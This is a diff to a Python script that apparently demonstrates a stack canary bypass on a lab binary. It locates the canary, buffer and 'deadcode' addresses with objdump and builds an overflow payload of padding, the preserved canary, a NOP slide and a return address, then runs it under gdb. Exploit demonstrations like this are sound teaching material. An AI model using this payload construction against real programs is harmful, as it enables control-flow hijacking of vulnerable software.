@@ -1,5 +1,4 @@
 import subprocess
-import os
 import struct
 import re
 
@@ -15,12 +14,12 @@ def analyze_binary(binary_path):
         deadcode_address = re.search(r'(\w+) <deadcode>:', objdump_output)
 
         if canary_address and buffer_address and deadcode_address:
-            return int(canary_address.group(1),16), int(buffer_address.group(1),16), int(deadcode_address.group(1),16)
+            return int(canary_address.group(1), 16), int(buffer_address.group(1), 16), int(deadcode_address.group(1), 16)
         else:
             raise ValueError("Could not find all necessary addresses (canary, buffer, deadcode).")
     except subprocess.CalledProcessError as e:
-        print(f"Failed to analyze binary: {e}")
-        exit(1)  #if binary cannot be analyzed
+        print(f"Failed to analyze binary, which is necessary for the operation: {e}")
+        exit(1)
     except ValueError as e:
         print(f"Error processing Address: {e}")
         exit(1)
@@ -28,23 +27,13 @@ def analyze_binary(binary_path):
 def create_payload(canary, deadcode_address):
     buffer_size = 64
     nop_slide = b"\x90" * 16
-    try:
-         # Convert hex string to integer if necessary
-        if isinstance(canary, str):
-            canary = int(canary, 16)
-        if isinstance(deadcode_address, str):
-            deadcode_address = int(deadcode_address, 16)
-        payload = b"A" * buffer_size
-        payload += struct.pack("<I", canary)  # preserving the canary
-        payload += nop_slide
-        payload += struct.pack("<I", deadcode_address)  # jumping to return address
-        return payload
-    except ValueError as e:
-        print(f"Error in payload creation: {e}")
-        raise
+    payload = b"A" * buffer_size
+    payload += struct.pack("<I", canary)  # preserving the canary
+    payload += nop_slide
+    payload += struct.pack("<I", deadcode_address)  # jumping to deadcode
+    return payload
 
 def gdb_auto_run(binary_path, payload):
-    """Automatically run gdb with the given payload."""
     gdb_commands = """
     set logging enabled on
     set pagination off
@@ -65,9 +54,10 @@ def gdb_auto_run(binary_path, payload):
         f.write(gdb_commands)
 
     gdb_process = subprocess.Popen(['gdb', '-x', gdb_script, binary_path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    gdb_process.communicate(input=payload)
+    output, errors = gdb_process.communicate(input=payload)
     gdb_process.wait()
     print("GDB session has completed. Check gdb_script.gdb for details.")
+    print(output.decode())  # Optionally print output
 
 def main():
     print("Starting Stack Canary Bypass demonstration...")
